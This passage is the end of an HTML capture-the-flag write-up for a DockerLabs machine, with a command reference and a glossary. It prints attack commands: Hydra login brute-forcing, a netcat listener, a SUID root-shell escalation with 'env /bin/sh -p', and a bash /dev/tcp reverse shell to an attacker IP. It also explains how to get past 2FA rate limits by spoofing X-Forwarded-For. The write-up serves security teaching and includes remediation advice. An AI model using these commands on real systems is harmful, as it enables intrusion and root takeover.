+                        <div class="cmd-ref-desc">Web application security testing platform used to intercept, inspect,
+                            and modify HTTP traffic. The match-and-replace feature allows transparent rewriting of
+                            request/response content in real time.</div>
+                        <ul class="cmd-ref-flags">
+                            <li><code>HTTP History</code> — all proxied requests and responses</li>
+                            <li><code>Repeater</code> — manually re-send and modify requests</li>
+                            <li><code>Match &amp; Replace</code> — auto-rewrite passing traffic</li>
+                            <li><code>Scope</code> — restrict proxy focus to target host</li>
+                        </ul>
+                    </div>
+
+                    <div class="cmd-ref-card">
+                        <div class="cmd-ref-name">Hydra</div>
+                        <div class="cmd-ref-syntax">hydra -l USER -P LIST TARGET http-post-form</div>
+                        <div class="cmd-ref-desc">Fast and parallelised network login cracker. The
+                            <code>http-post-form</code> module supports custom POST endpoints with configurable
+                            success/failure detection strings.</div>
+                        <ul class="cmd-ref-flags">
+                            <li><code>-l</code> — single username / login</li>
+                            <li><code>-P</code> — password wordlist file</li>
+                            <li><code>-s</code> — custom port</li>
+                            <li><code>-V</code> — verbose, show each attempt</li>
+                            <li><code>F=string</code> — failure condition string</li>
+                        </ul>
+                    </div>
+
+                    <div class="cmd-ref-card">
+                        <div class="cmd-ref-name">netcat (nc)</div>
+                        <div class="cmd-ref-syntax">nc -nlvp &lt;port&gt;</div>
+                        <div class="cmd-ref-desc">The TCP/UDP Swiss Army knife. Used here as a reverse shell listener:
+                            waits for an incoming connection from the target and provides an interactive shell session.
+                        </div>
+                        <ul class="cmd-ref-flags">
+                            <li><code>-n</code> — no DNS resolution</li>
+                            <li><code>-l</code> — listen mode</li>
+                            <li><code>-v</code> — verbose output</li>
+                            <li><code>-p</code> — specify port number</li>
+                        </ul>
+                    </div>
+
+                    <div class="cmd-ref-card">
+                        <div class="cmd-ref-name">find (SUID search)</div>
+                        <div class="cmd-ref-syntax">find / -perm -4000 2&gt;/dev/null</div>
+                        <div class="cmd-ref-desc">Searches the entire filesystem for binaries with the SUID bit set.
+                            SUID binaries run as the file owner (usually root), making them prime privilege escalation
+                            candidates when misconfigured.</div>
+                        <ul class="cmd-ref-flags">
+                            <li><code>-perm -4000</code> — SUID bit set</li>
+                            <li><code>-perm -2000</code> — SGID bit set</li>
+                            <li><code>2&gt;/dev/null</code> — suppress permission errors</li>
+                            <li>Cross-reference results with <strong>GTFOBins</strong></li>
+                        </ul>
+                    </div>
+
+                    <div class="cmd-ref-card">
+                        <div class="cmd-ref-name">ThreadPoolExecutor (Python)</div>
+                        <div class="cmd-ref-syntax">from concurrent.futures import ThreadPoolExecutor</div>
+                        <div class="cmd-ref-desc">Python standard library module for managing a pool of threads. Used in
+                            fuzzer.py to issue up to 40 concurrent HTTP registration requests, dramatically reducing the
+                            time to enumerate 100,000 DNI candidates.</div>
+                        <ul class="cmd-ref-flags">
+                            <li><code>max_workers</code> — thread pool size</li>
+                            <li><code>executor.map(fn, iterable)</code> — parallel dispatch</li>
+                            <li>Use locks (<code>threading.Lock</code>) for shared state</li>
+                        </ul>
+                    </div>
+
+                    <div class="cmd-ref-card">
+                        <div class="cmd-ref-name">env (SUID exploit)</div>
+                        <div class="cmd-ref-syntax">env /bin/sh -p</div>
+                        <div class="cmd-ref-desc">When the <code>env</code> binary has the SUID bit set and is owned by
+                            root, it can be used to spawn a privileged shell. The <code>-p</code> flag to
+                            <code>/bin/sh</code> tells the shell not to reset the effective UID.</div>
+                        <ul class="cmd-ref-flags">
+                            <li><code>env</code> — run program in modified environment</li>
+                            <li><code>/bin/sh -p</code> — shell preserving effective UID</li>
+                            <li>Listed on <strong>GTFOBins</strong> under SUID</li>
+                        </ul>
+                    </div>
+
+                </div>
+            </div>
+
+            <hr class="divider">
+
+            <!-- ============================================================ GLOSSARY -->
+            <div class="section" id="glossary">
+                <p class="section-label">// 08</p>
+                <h2 class="section-title">Glossary</h2>
+                <div class="section-line"></div>
+
+                <div class="glos-grid">
+
+                    <div class="glos-card">
+                        <div class="glos-term">DNI Oracle / User Enumeration</div>
+                        <div class="glos-def">
+                            An <strong>enumeration oracle</strong> is any application behaviour that allows
+                            an attacker to distinguish between two states — in this case, whether a given DNI
+                            belongs to a registered user or not. Even a subtle difference in response content,
+                            timing, or HTTP status code is enough to build an automated scanner. The
+                            <strong>OWASP Testing Guide (OTG-IDENT-004)</strong> specifically covers user
+                            enumeration as a high-priority test case, since it provides attackers with the
+                            first half of a valid credential pair (the username/identity) at zero cost.
+                            The correct remediation is to return a <strong>generic, identical response</strong>
+                            regardless of whether the DNI is known.
+                        </div>
+                    </div>
+
+                    <div class="glos-card">
+                        <div class="glos-term">X-Forwarded-For Header</div>
+                        <div class="glos-def">
+                            <strong>X-Forwarded-For (XFF)</strong> is an HTTP header added by reverse proxies
+                            and load balancers to preserve the originating client's IP address as the request
+                            traverses infrastructure. Its format is
+                            <code>X-Forwarded-For: client, proxy1, proxy2</code>.
+                            Because HTTP headers are fully user-controlled, any application that uses XFF
+                            to make security-sensitive decisions (rate limiting, geo-blocking, access control)
+                            without proper validation is vulnerable to <strong>IP spoofing</strong>. The only
+                            reliable source of the real client IP is the TCP connection's remote address, which
+                            cannot be forged on a standard TCP connection.
+                        </div>
+                    </div>
+
+                    <div class="glos-card">
+                        <div class="glos-term">Two-Factor Authentication (2FA) &amp; Rate Limiting</div>
+                        <div class="glos-def">
+                            <strong>2FA</strong> adds a second verification factor beyond a password —
+                            typically a time-based one-time password (TOTP) or a PIN sent via SMS/email.
+                            Its security depends entirely on the server enforcing a strict
+                            <strong>attempt limit per session</strong> before the code expires. Tracking
+                            attempts by IP address (instead of by session or account) is a well-known
+                            anti-pattern: IP-based controls are trivially bypassed via VPNs, proxies, or,
+                            as demonstrated here, by spoofing the <code>X-Forwarded-For</code> header.
+                            Robust 2FA implementations lock the <em>account</em> or the
+                            <em>specific code</em> after 3–5 failed attempts regardless of source IP.
+                        </div>
+                    </div>
+
+                    <div class="glos-card">
+                        <div class="glos-term">Client-Side Access Control</div>
+                        <div class="glos-def">
+                            <strong>Client-side access control</strong> refers to the anti-pattern of making
+                            authorisation decisions based on data returned to — and therefore modifiable by —
+                            the end user. Common manifestations include role values stored in unsigned cookies,
+                            local storage, or API responses that the frontend reads to show or hide UI elements.
+                            An attacker who can modify this data (via a proxy, browser devtools, or Burp) can
+                            trivially elevate their privileges. All access control checks must be enforced
+                            <strong>server-side on every request</strong> using a tamper-proof, server-managed
+                            session. This class of vulnerability falls under <strong>OWASP A01:2021 —
+                                Broken Access Control</strong>, the top web application risk category.
+                        </div>
+                    </div>
+
+                    <div class="glos-card">
+                        <div class="glos-term">OS Command Injection</div>
+                        <div class="glos-def">
+                            <strong>OS command injection</strong> occurs when an application passes
+                            unsanitised user-supplied input to a system shell. Attackers can append additional
+                            shell commands using metacharacters such as <code>;</code>, <code>&amp;&amp;</code>,
+                            <code>|</code>, or backticks. In this lab, the review rating field was passed
+                            directly to a shell call, allowing arbitrary command execution. Prevention requires
+                            <strong>never constructing shell commands from user input</strong> — use
+                            parameterised APIs (e.g. Python's <code>subprocess</code> with a list argument and
+                            <code>shell=False</code>) or robust allowlist validation of all inputs.
+                            This maps to <strong>OWASP A03:2021 — Injection</strong>.
+                        </div>
+                    </div>
+
+                    <div class="glos-card">
+                        <div class="glos-term">SUID Bit &amp; GTFOBins</div>
+                        <div class="glos-def">
+                            The <strong>SUID (Set User ID) bit</strong> is a Unix permission flag that causes
+                            an executable to run with the permissions of its owner rather than the invoking
+                            user. This is intentional for binaries like <code>passwd</code> (which needs root
+                            to write <code>/etc/shadow</code>), but catastrophic when applied to general-purpose
+                            tools. <strong>GTFOBins</strong> (gtfobins.github.io) is a curated list of Unix
+                            binaries that can be exploited when they have SUID set, sudo privileges, or are
+                            invoked from a restricted shell. <code>env</code> with SUID is a textbook GTFOBins
+                            entry: <code>env /bin/sh -p</code> spawns a root shell immediately because
+                            <code>sh -p</code> preserves the elevated effective UID inherited from the
+                            SUID binary.
+                        </div>
+                    </div>
+
+                    <div class="glos-card">
+                        <div class="glos-term">Reverse Shell via /dev/tcp</div>
+                        <div class="glos-def">
+                            A <strong>reverse shell</strong> initiates the TCP connection from the victim
+                            to the attacker, bypassing firewalls that block inbound connections.
+                            <code>/dev/tcp/host/port</code> is a Bash built-in pseudo-device that opens a
+                            TCP socket without requiring any external binaries. The payload
+                            <code>bash -i &gt;&amp; /dev/tcp/10.0.2.15/666 0&gt;&amp;1</code> redirects all
+                            three file descriptors (stdin, stdout, stderr) over the TCP connection to the
+                            attacker's listener, creating a fully interactive remote shell session.
+                            This technique requires that the target system runs <strong>Bash</strong> and
+                            that the <code>/dev/tcp</code> virtual filesystem is enabled in the build
+                            (it is on most Linux distributions).
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+
+        </main>
+    </div>
+
+    <footer>
+        © Designed &amp; Built by <em>Fran</em> — Trailpack · DockerLabs Write-up · May 2026
+    </footer>
+
+    <script>
+        const navEl = document.getElementById('nav');
+        window.addEventListener('scroll', () => {
+            navEl.style.borderBottomColor = scrollY > 30
+                ? 'rgba(0,210,255,0.1)' : 'rgba(0,210,255,0.07)';
+        }, { passive: true });
+
+        window.addEventListener('scroll', () => {
+            const winScroll = document.documentElement.scrollTop;
+            const height = document.documentElement.scrollHeight - window.innerHeight;
+            const scrolled = height > 0 ? (winScroll / height) * 100 : 0;
+            document.getElementById('readingProgress').style.width = scrolled + '%';
+        }, { passive: true });
+
+        const sections = document.querySelectorAll('.section[id]');
+        const tocLinks = document.querySelectorAll('.toc-list a');
+        const tocObserver = new IntersectionObserver(entries => {
+            entries.forEach(e => {
+                if (e.isIntersecting) {
+                    tocLinks.forEach(a => a.classList.remove('active'));
+                    const active = document.querySelector(`.toc-list a[href="#${e.target.id}"]`);
+                    if (active) active.classList.add('active');
+                }
+            });
+        }, { rootMargin: '-20% 0px -65% 0px' });
+        sections.forEach(s => tocObserver.observe(s));
+
+        const obs = new IntersectionObserver(entries => {
+            entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
+        }, { threshold: 0.06 });
+        document.querySelectorAll('.section').forEach(s => obs.observe(s));
+
+        function showToast(msg) {
+            let toast = document.querySelector('.toast');
+            if (!toast) {
+                toast = document.createElement('div');
+                toast.className = 'toast';
+                document.body.appendChild(toast);
+            }
+            toast.textContent = msg;
+            toast.classList.add('show');
+            setTimeout(() => toast.classList.remove('show'), 2000);
+        }
+
+        function copyCmd(btn) {
+            const block = btn.closest('.cmd-block');
+            const cmd = block.dataset.cmd || '';
+            if (!cmd) return;
+            navigator.clipboard.writeText(cmd).then(() => {
+                btn.textContent = '✓';
+                btn.classList.add('copied');
+                showToast('Command copied ✓');
+                setTimeout(() => {
+                    btn.textContent = 'COPY';
+                    btn.classList.remove('copied');
+                }, 1800);
+            }).catch(() => showToast('Copy error'));
+        }
+    </script>
+
+</body>
+
+</html>
